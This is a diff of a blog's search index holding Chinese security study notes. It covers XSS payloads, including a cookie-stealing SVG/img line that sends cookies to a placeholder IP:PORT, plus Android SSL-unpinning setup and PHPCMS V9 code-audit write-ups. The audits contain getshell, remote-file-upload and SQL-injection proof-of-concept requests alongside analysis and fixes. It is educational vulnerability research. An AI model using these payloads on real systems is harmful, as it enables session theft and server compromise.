class="string">&#x27;~a~le~rt~~(~~1~~)~\&#x27;.replace(/~/g, \&#x27;\&#x27;))</span></span><br><span class="line"><span class="string">eval(/~a~le~rt~~(~~1~~)~/.source.replace(/~/g, new String()))</span></span><br><span class="line"><span class="string">var x = eval; x(‘alert(1)’)</span></span><br><span class="line"><span class="string">(1, eval)(&#x27;</span>alert(<span class="number">1</span>)<span class="string">&#x27;) </span></span><br><span class="line"><span class="string">eval.call(null, &#x27;</span>alert(<span class="number">1</span>)<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="SVG黑魔法-IMG标签-等其他同理"><a href="#SVG黑魔法-IMG标签-等其他同理" class="headerlink" title="SVG黑魔法 IMG标签 等其他同理"></a>SVG黑魔法 IMG标签 等其他同理</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">1234</span></span><br><span class="line">&lt;svg/onload=<span class="string">&quot;document.location=&#x27;http://IP:PORT/?&#x27;+document.URL+&#x27;:&#x27;+document.cookie&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&quot;document.location=&#x27;http://IP:PORT/?&#x27;+document.URL+&#x27;:&#x27;+document.cookie&quot;</span>&gt;</span><br><span class="line">获取当前域名URL：</span><br><span class="line"><span class="built_in">window</span>.location.href</span><br><span class="line"><span class="built_in">document</span>.location</span><br><span class="line"><span class="built_in">document</span>.URL</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gqs7ls5nf0j30if087jug.jpg" alt="image-20210519080602555"></p>
+<h3 id="图片探测路径"><a href="#图片探测路径" class="headerlink" title="图片探测路径"></a>图片探测路径</h3><blockquote>
+<p>只要对方网站可以调用外部图片(或可自定义HTML)。你就可以拿到对方当前的后台、浏览器、IP地址之类的信息【有些网站做了meta referer设置，referer就抓不到了】<br>搜索图片XSS即可,XSS平台是有这种的。原理就是图片嵌入了前端的一些代码。</p>
+<p>例如：&lt;img src=”<a href="http://ip/test.php&quot;/&gt;">http://IP/test.php&quot;/&gt;</a><br>然后再PHP里面写入获取HTTP_REFERER’<code>,</code>‘REMOTE_ADDR’<code>,</code>‘HTTP_USER_AGENT<br>即可达到目的</p>
+</blockquote>
+<h3 id="console设置Cookie"><a href="#console设置Cookie" class="headerlink" title="console设置Cookie"></a>console设置Cookie</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> cookiestr=<span class="string">&quot;你的打到的cookie内容&quot;</span>;<span class="keyword">var</span> arr = cookiestr.split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> arr)&#123;<span class="built_in">document</span>.cookie=arr[i];&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="前端钓鱼"><a href="#前端钓鱼" class="headerlink" title="前端钓鱼"></a>前端钓鱼</h3><p><a href="https://www.cnblogs.com/-qing-/p/10871625.html">https://www.cnblogs.com/-qing-/p/10871625.html</a></p>
+<h3 id="apache-httponly-bypass"><a href="#apache-httponly-bypass" class="headerlink" title="apache httponly bypass"></a>apache httponly bypass</h3><blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用apache server head limit 8192字节限制, 从400状态页爆出httponly保护的cookie</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="预防XSS"><a href="#预防XSS" class="headerlink" title="预防XSS"></a>预防XSS</h3><p>CSP策略：<a href="https://www.zhihu.com/question/21979782">https://www.zhihu.com/question/21979782</a><br>PHP的函数：htmlspecialchars、htmlentities</p>
+<blockquote>
+<p>​    htmlspecialchars默认配置是不过滤单引号的。只有设置了：quotestyle 选项为ENT_QUOTES才会过滤单引号，所以咋只要’onmouseover=’alert(document.domain)这样既可绕过，根据实际情况来吧。</p>
+</blockquote>
+<p>参考：<a href="https://xz.aliyun.com/t/4067">https://xz.aliyun.com/t/4067</a><br><a href="https://www.cnblogs.com/-qing-/p/10872564.html">https://www.cnblogs.com/-qing-/p/10872564.html</a></p>
+]]></content>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>安卓无法抓取HTTPS问题</title>
+    <url>/2021/07/20/%E5%AE%89%E5%8D%93%E6%97%A0%E6%B3%95%E6%8A%93%E5%8F%96HTTPS%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<center>安卓无法抓取HTTPS问题</center>
+
+<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>1、证书问题</p>
+<p>2、ssl pinning问题</p>
+<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>如果不需要重放等功能直接使用 HttpCanary ，傻瓜式一键操作。</p>
+<p>原因：新版本功能也比较强大，也是支持的但是就是不太舒服。</p>
+<p>正经说 网上教程也太多了，就不说了。默认root+Magisk+EdXposed</p>
+<h4 id="导入CA"><a href="#导入CA" class="headerlink" title="导入CA"></a>导入CA</h4><p>导出 Burp 根证书，然后用 openssl 将证书转换为安卓认识的 .0 文件</p>
+<blockquote>
+<p>openssl x509 -inform DER -in cacert.der -out cacert.pem<br>openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1</p>
+</blockquote>
+<p>//得到的字符串命名文件为 字符串.0 例如    9a5ba575.0</p>
+<p>如果导出的是 Burp 的证书，操作正确文件名一定为 9a5ba575.0</p>
+<p>如果不懂 Magisk 包的制作也不想了解怎么制作直接将这个文件扔进 <code>/system/etc/security/cacerts</code> 然后权限改为 600，最后重启就行了</p>
+<p>如果想用 Magisk 加载就用我提供的 copy_burp_ca.zip，替换压缩包里的 <code>/system/etc/security/cacerts/9a5ba575.0</code> 为你自己的文件，然后用 Magisk 刷入</p>
+<h4 id="加载-SSLUnpinning"><a href="#加载-SSLUnpinning" class="headerlink" title="加载 SSLUnpinning"></a>加载 SSLUnpinning</h4><p>Xposed 使用 <a href="https://github.com/ElderDrivers/EdXposed">EdXposed</a>，如果 root 管理器使用的是 Magisk 可以直接在然后 Magisk 里面搜 EdXposed 就可安装，EdXposed 装好后加载 <a href="https://github.com/ViRb3/TrustMeAlready">TrustMeAlready</a> 可开启 SSLUnpinning<br>网上看到很多人说用JustTrustMe，亲测效果很差。这个很OK。</p>
+<h3 id="附件下载"><a href="#附件下载" class="headerlink" title="附件下载"></a>附件下载</h3><p><a href="https://pan.baidu.com/s/18ej1cRfnEkzOKXICeYUFEQ">copy_burp_ca.zip</a>提取码:6d64</p>
+<p>参考：<a href="https://loli.world/archives/fxxk-android-app/">https://loli.world/archives/fxxk-android-app/</a></p>
+]]></content>
+      <tags>
+        <tag>杂七杂八</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DedeCMS历史版本代码审计学习</title>
-    <url>/2021/07/18/DedeCMS%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
+    <url>/2021/07/21/DedeCMS%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<center>DEDECMS历史版本代码审计学习</center>
 
 <blockquote>
@@ -979,201 +912,464 @@
 ]]></content>
   </entry>
   <entry>
-    <title>安卓无法抓取HTTPS问题</title>
-    <url>/2021/07/20/%E5%AE%89%E5%8D%93%E6%97%A0%E6%B3%95%E6%8A%93%E5%8F%96HTTPS%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<center>安卓无法抓取HTTPS问题</center>
+    <title>PHPCMSV9版本代码审计学习</title>
+    <url>/2021/07/21/PHPCMSV9%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>学习代码审计，自己简单记录一下。如有错误望师傅斧正。</p>
+<h1 id="PHPCMS预备知识"><a href="#PHPCMS预备知识" class="headerlink" title="PHPCMS预备知识"></a>PHPCMS预备知识</h1><p>PHPCMS是采用MVC设计模式开发,基于模块和操作的方式进行访问，采用单一入口模式进行项目部署和访问，无论访问任何一个模块或者功能，只有一个统一的入口。</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数名称</th>
+<th align="left">描述</th>
+<th align="left">位置</th>
+<th align="left">备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">m</td>
+<td align="left">模型/模块名称</td>
+<td align="left"><code>phpcms/modules中模块目录名称</code></td>
+<td align="left">必须</td>
+</tr>
+<tr>
+<td align="left">c</td>
+<td align="left">控制器名称</td>
+<td align="left"><code>phpcms/modules/模块/*.php 文件名称</code></td>
+<td align="left">必须</td>
+</tr>
+<tr>
+<td align="left">a</td>
+<td align="left">事件名称</td>
+<td align="left"><code>phpcms/modules/模块/*.php 中方法名称</code></td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<h1 id="PHPCMSV9-2上传Getshell"><a href="#PHPCMSV9-2上传Getshell" class="headerlink" title="PHPCMSV9.2上传Getshell"></a>PHPCMSV9.2上传Getshell</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>我们搭建好环境直接注册，找到修改头像。</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzrigivnj30z60f2k4s.jpg" alt="image-20210713205932313">)</p>
+<p>我们在本地创建一个zip文件里面包含一个文件夹，一个我们的恶意代码。通过Burp修改掉。</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzrutaqtj30sv0a0454.jpg" alt="image-20210713210052053"></p>
+<p>访问<code>phpsso_server/uploadfile/avatar/1/1/1/av/av.php</code> 其中1是我们的uid</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gshzs49tp2j319d0kaduq.jpg" alt="image-20210713212930046"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>重复以上步骤。通过burp我们找到上传事件，我们直接去代码定位这个函数。</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gt05be3entj30u80csguv.jpg" alt="image-20210713210251188"></p>
+<p>然后去代码找到函数直接断点调试</p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzslx85uj30y10hydqz.jpg" alt="image-20210713210620009"></p>
+<p>根据用户UID创建文件夹，防止用户多了文件夹重复创建了两次，然后检测目录创建，没有就创建一次，否则跳过。</p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzstn2esj31bj0j6tmz.jpg" alt="image-20210713211150731"></p>
+<p>根据uid重命名我们的压缩包文件</p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzt0bshij31c10m5kd9.jpg" alt="image-20210713211348264"></p>
+<p>压缩包的文件就是我们上传的压缩包文件</p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzt7kgtdj30bk04774r.jpg" alt="image-20210713211535141"></p>
+<p>之后进行解压缩文件</p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzti1c3pj31aa0hn17y.jpg" alt="image-20210713211744654"></p>
+<p>之后进入dir中循环判断文件安全，删除压缩包和非jpg图片</p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshztns77ej318n0fb7dw.jpg" alt="image-20210713211943208"></p>
+<p>走到遍历白名单判断文件，排除<code>.</code>（当前目录）<code>..</code>（上级目录）下图删除了压缩包文件</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzttgnamj311t0d6gxi.jpg" alt="image-20210713212302942"></p>
+<p>再次循环时$file=av 而av是目录。unlink是不能删除目录的。所以出现异常。</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gshzu0r93cj30z607itd6.jpg" alt="image-20210713212333388"></p>
+<p>所以进而我们的恶意文件留在了服务器里面。这就是为什么上面利用的压缩包里的恶意代码文件需要放在目录下</p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>不使用zip压缩包处理图片文件。因为后端需要处理特别多的数据。</p>
+<h1 id="PHPCMSV9-6-0任意文件上传漏洞"><a href="#PHPCMSV9-6-0任意文件上传漏洞" class="headerlink" title="PHPCMSV9.6.0任意文件上传漏洞"></a>PHPCMSV9.6.0任意文件上传漏洞</h1><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先注册然后抓包</p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzu6buhdj314l0e67co.jpg" alt="image-20210714095036774"></p>
+<p>其中要准备一个远程的服务器下的恶意代码</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gshzuc5t5hj30nc05bgn0.jpg" alt="image-20210714104836022"></p>
+<p>准备我们的POC如下</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">siteid=1&amp;modelid=11&amp;username=123456&amp;password=123456&amp;email=12345@qq.com&amp;info[content]=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://192.168.0.100/phpinfo.txt?.php#.jpg</span>&gt;</span>&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure>
 
-<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>1、证书问题</p>
-<p>2、ssl pinning问题</p>
-<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>如果不需要重放等功能直接使用 HttpCanary ，傻瓜式一键操作。</p>
-<p>原因：新版本功能也比较强大，也是支持的但是就是不太舒服。</p>
-<p>正经说 网上教程也太多了，就不说了。默认root+Magisk+EdXposed</p>
-<h4 id="导入CA"><a href="#导入CA" class="headerlink" title="导入CA"></a>导入CA</h4><p>导出 Burp 根证书，然后用 openssl 将证书转换为安卓认识的 .0 文件</p>
+<p>然后修改放包会报一个错误，会返回我们的URL路径</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzul1xt5j312y07iafe.jpg" alt="image-20210714095300962"></p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzurpcydj31740nv17m.jpg" alt="image-20210714095331750"></p>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们直接找到刚刚我们的包，他是在<code>index.php</code>进入<code>member</code>模块中的<code>index</code>文件里面有一个<code>register</code>函数</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzuy4g3aj31e00gx7jx.jpg" alt="image-20210714100019749"></p>
+<p>我们现在打开我们的代码定位函数，路径如下</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gshzv3xwb0j314q0gnthu.jpg" alt="image-20210714110048083"></p>
+<p>为了更好的理解POC的巧妙。我们正常注册一次然后用POC注册一次分析</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzv9kibwj30x60lhdwc.jpg" alt="image-20210714131702013"></p>
+<p>前面就是一堆信息的验证作用不大，我们继续跟踪到130行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$member_setting</span>[<span class="string">&#x27;choosemodel&#x27;</span>]) &#123;</span><br><span class="line">	<span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">&#x27;member_input.class.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">&#x27;member_update.class.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$member_input</span> = <span class="keyword">new</span> member_input(<span class="variable">$userinfo</span>[<span class="string">&#x27;modelid&#x27;</span>]);		</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;info&#x27;</span>] = array_map(<span class="string">&#x27;new_html_special_chars&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;info&#x27;</span>]);</span><br><span class="line">	<span class="variable">$user_model_info</span> = <span class="variable">$member_input</span>-&gt;get(<span class="variable">$_POST</span>[<span class="string">&#x27;info&#x27;</span>]);	<span class="comment">//重点			        	&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这里我们看见<code>$_POST[&#39;info&#39;]</code>使用了<code>member_input</code>类中的<code>get</code>方法我们跟踪进去。</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzvf38lpj313007sq91.jpg" alt="image-20210714172524854"></p>
+<p>走到47行获取了<code>datatime</code>函数，<code>this-&gt;fields</code>是一个动态函数对应的一张表根据<code>modelid</code>来确定的<code>formytpe</code>。如下图</p>
+<p>【也可以跟进去一步步来，微信搜索黑白天的文章。有详细解释，建议自己跟一遍】</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzvla65yj31110nmwv0.jpg" alt="image-20210715111531976"></p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzvsdobdj312108nwj5.jpg" alt="image-20210714172423802"></p>
+<p>我那们跟进去<code>datatime</code>函数 就是做了一校验然后又返回给<code>$value</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzvy3143j311b0d6gtu.jpg" alt="image-20210715112429559"></p>
+<p>然后就是插入两次数据库，一个插入<code>v9_member</code>表一个生日日期和用户id插入到<code>v9_member_detail</code>表中，至此正常流程走完。</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzw4telvj31420fpqap.jpg" alt="image-20210714174943523"></p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzwaogknj313c0gawno.jpg" alt="image-20210714174429168"></p>
+<p>接下来我们分析一下POC流程</p>
 <blockquote>
-<p>openssl x509 -inform DER -in cacert.der -out cacert.pem<br>openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1</p>
+<p>值得注意的是我们必须保证username email是唯一</p>
 </blockquote>
-<p>//得到的字符串命名文件为 字符串.0 例如    9a5ba575.0</p>
-<p>如果导出的是 Burp 的证书，操作正确文件名一定为 9a5ba575.0</p>
-<p>如果不懂 Magisk 包的制作也不想了解怎么制作直接将这个文件扔进 <code>/system/etc/security/cacerts</code> 然后权限改为 600，最后重启就行了</p>
-<p>如果想用 Magisk 加载就用我提供的 copy_burp_ca.zip，替换压缩包里的 <code>/system/etc/security/cacerts/9a5ba575.0</code> 为你自己的文件，然后用 Magisk 刷入</p>
-<h4 id="加载-SSLUnpinning"><a href="#加载-SSLUnpinning" class="headerlink" title="加载 SSLUnpinning"></a>加载 SSLUnpinning</h4><p>Xposed 使用 <a href="https://github.com/ElderDrivers/EdXposed">EdXposed</a>，如果 root 管理器使用的是 Magisk 可以直接在然后 Magisk 里面搜 EdXposed 就可安装，EdXposed 装好后加载 <a href="https://github.com/ViRb3/TrustMeAlready">TrustMeAlready</a> 可开启 SSLUnpinning<br>网上看到很多人说用JustTrustMe，亲测效果很差。这个很OK。</p>
-<h3 id="附件下载"><a href="#附件下载" class="headerlink" title="附件下载"></a>附件下载</h3><p><a href="https://pan.baidu.com/s/18ej1cRfnEkzOKXICeYUFEQ">copy_burp_ca.zip</a>提取码:6d64</p>
-<p>参考：<a href="https://loli.world/archives/fxxk-android-app/">https://loli.world/archives/fxxk-android-app/</a></p>
-]]></content>
+<p> 然后我们继续定位到130行，发现<code>content</code>是我们的内容<img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzwgqsh5j314t0g5amp.jpg" alt="image-20210715115513282"></p>
+<p> 经过<code>new_html_special_chars</code>就是防止XSS 所以实体化<img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzwo6x5oj30rc05r77f.jpg" alt="image-20210715115539585"></p>
+<p> 于是我们变成了下面这样子。继续跟踪get方法同上<img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzwuxkkcj314h0grwrl.jpg" alt="image-20210715115601890"></p>
+<p>这里我们获取的是<code>editor</code>函数。</p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzx0f0hij313z0dwaig.jpg" alt="image-20210715114208216"></p>
+<p>在这个函数中我们有一个<code>download</code>方法</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gshzx5z7tij60t405hadx02.jpg" alt="image-20210715122725543"></p>
+<p>我们跟踪download方法，发现以下关键代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ext &#x3D; &#39;gif|jpg|jpeg|bmp|png&#39;</span><br><span class="line">if(!preg_match_all(&quot;&#x2F;(href|src)&#x3D;([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2&#x2F;i&quot;, $string, $matches)) return $value;</span><br></pre></td></tr></table></figure>
+
+<p>这就是为什么我们写info[content]=&lt;img src-<a href="http://xxxx/phpinfo.txt?.php#.jpg%EF%BC%88%E7%AC%A6%E5%90%88%E8%BF%99%E4%B8%AA%E6%A0%BC%E5%BC%8F%EF%BC%8C%E8%80%8C%E4%B8%94%E5%8A%A0%60.jpg%60%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%89">http://xxxx/phpinfo.txt?.php#.jpg（符合这个格式，而且加`.jpg`的原因）</a></p>
+<p>到155行这里他把我们的<code>$string</code>值复制给了<code>$matches</code> </p>
+<p>$matches [3]刚好是我们的链接，所以真的很巧妙</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzxbfvs3j313b0h6gxm.jpg" alt="image-20210715120332699"></p>
+<p>接着我们跟踪<code>fillurl</code>方法,里面有一串关键代码如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pos &#x3D; strpos($surl,&#39;#&#39;);</span><br><span class="line">		if($pos&gt;0) $surl &#x3D; substr($surl,0,$pos);</span><br></pre></td></tr></table></figure>
+
+<p><code>strpos</code>定位#，然后使用<code>substr</code>处理<code>?.php#.jpg</code>，处理完之后<code>$surl =?.php</code>继续执行，可以发现返回的url去掉了#后面的内容</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzxh2uw7j60zb0fwqds02.jpg" alt="image-20210715120530900"></p>
+<p>然后获取后缀名。然后通过<code>getname</code>方法生成时间+三位数的文件名，如果不返回文件地址的url我们也可以进行爆破处理。</p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzxmxzf2j312506c7b0.jpg" alt="image-20210715121811584"></p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gshzxrz6f9j30no03w3ze.jpg" alt="image-20210715121521423"></p>
+<p>此时进行了<code>copy</code>函数对远程文件下载</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gshzxx4awzj31380aun5c.jpg" alt="image-20210715123850218"></p>
+<p>这里的<code>$this-&gt;upload_func</code>是copy函数的原因，是因为初始化时赋给的</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzy2dovdj30po07jjvj.jpg" alt="image-20210715123444761"></p>
+<p>此时我们的文件已经到我们的本地了</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gshzy7gau7j30ql0503zr.jpg" alt="image-20210715124006568"></p>
+<p>接着我们来看看写入文件的路劲是如何返回给我们的。上面程序执行完以后，回到了<code>register </code>函数中：</p>
+<p>继续跟进<code>$this-&gt;db-&gt;insert($user_model_info);</code> 发现数据库插入的字段都不一样继续执行就会报错。前台提示的信息一样，没有这个字段当然报错</p>
+<p>Message : Unknown column ‘content’ in ‘field list’</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gshzycogp2j310f0lk4e2.jpg" alt="image-20210715124757737"></p>
+<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在phpcms9.6.1中修复了该漏洞，修复方案就是对用<code>fileext</code>获取到的文件后缀再用黑白名单分别过滤一次</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$filename</span> = fileext(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/(<span class="subst">$ext</span>)/is&quot;</span>,<span class="variable">$filename</span>) || in_array(<span class="variable">$filename</span>, 		<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;phtml&#x27;</span>,<span class="string">&#x27;php3&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;jsp&#x27;</span>,<span class="string">&#x27;dll&#x27;</span>,<span class="string">&#x27;asp&#x27;</span>,<span class="string">&#x27;cer&#x27;</span>,<span class="string">&#x27;asa&#x27;</span>,<span class="string">&#x27;shtml&#x27;</span>,<span class="string">&#x27;shtm&#x27;</span>,<span class="string">&#x27;aspx&#x27;</span>,<span class="string">&#x27;asax&#x27;</span>,<span class="string">&#x27;cgi&#x27;</span>,<span class="string">&#x27;fcgi&#x27;</span>,<span class="string">&#x27;pl&#x27;</span>)))&#123;</span><br><span class="line"> 			<span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="PHPCMSV9-6-0-WAP模块-SQL注入分析"><a href="#PHPCMSV9-6-0-WAP模块-SQL注入分析" class="headerlink" title="PHPCMSV9.6.0 WAP模块 SQL注入分析"></a>PHPCMSV9.6.0 WAP模块 SQL注入分析</h1><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先第一步访问</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/index.php?m=wap&amp;c=index&amp;siteid=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzyibq26j30yf0bhdkh.jpg" alt="image-20210715161331519"></p>
+<p>把得到的set-cookie 记录下来</p>
+<p>第二步以POST方式访问【下面是测试爆user的】就是一个报错注入语句</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26</span><br></pre></td></tr></table></figure>
+
+<p>并且传参<code>userid_flash</code>其中的值就是第一步我们得到的<code>set-cookie</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">userid_flash&#x3D;72eciDDbmkE3Tr6LjGQhB3H34p3N1xsgWWbi2VNY</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gshzynsljcj30yd0dxgst.jpg" alt="image-20210715162132366"></p>
+<p>把加密的<code>json</code>值记录下来</p>
+<p>第三步以POST的方式访问</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a_k&#x3D;第二步得到的Json值</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzytncdwj316i0emwn5.jpg" alt="image-20210715163120554"></p>
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>其实我们就是通过最后一次提交的数据来爆出来的东西。我们就逆向分析。看第三步的URL做了些什么</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a_k&#x3D;第二步得到的Json值</span><br></pre></td></tr></table></figure>
+
+<p>我们定位到<code>content</code>模块<code>down</code>文件中发现并没有<code>a_k</code>方法</p>
+<p>说明是自动执行的那就是<code>init()</code>和<code>__construct()</code></p>
+<p><code>__construct()</code>基本没东西，我们直接下断<code>init</code></p>
+<p>走到14行看到<code>sys_auth</code>然后他就是一个加密解密的函数，我们这里不分析加密解密只分析功能</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzyyyv6mj316m0al7dq.jpg" alt="image-20210715164258371"></p>
+<p>经过<code>sys_auth</code>解密得到</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;aid&quot;:1,&quot;src&quot;:&quot;&amp;id&#x3D;%27 and updatexml(1,concat(1,(user())),1)#&amp;m&#x3D;1&amp;f&#x3D;haha&amp;modelid&#x3D;2&amp;catid&#x3D;7&amp;&quot;,&quot;filename&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>走到17行发现一个系统函数<code>parse_str</code> 这个函数用不好容易出现变量覆盖。可以自己查一下</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gshzz5ei7jj30s80ha11m.jpg" alt="image-20210715165137462"></p>
+<p>我们知道用法了就是把<code>$id</code>给弄出来</p>
+<p>然后直接到26行跟踪<code>get_one</code>函数，发现后面就直接执行语句了。</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gshzzdjm7dj614v0grqcu02.jpg" alt="image-20210715173420523"></p>
+<p>肯定有人现在好奇那第三步为什么会得到这个值，我们返回到14行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a_k &#x3D; sys_auth($a_k, &#39;DECODE&#39;, pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;));</span><br></pre></td></tr></table></figure>
+
+<p>我们怎么得到a_k的值，怎么得到的这个规范进行解密，因为他需要(‘system’,’auth_key’)我们并不知道</p>
+<p>所以我们需要知道谁调用了这个函数</p>
+<p>我们回到第二步的POC</p>
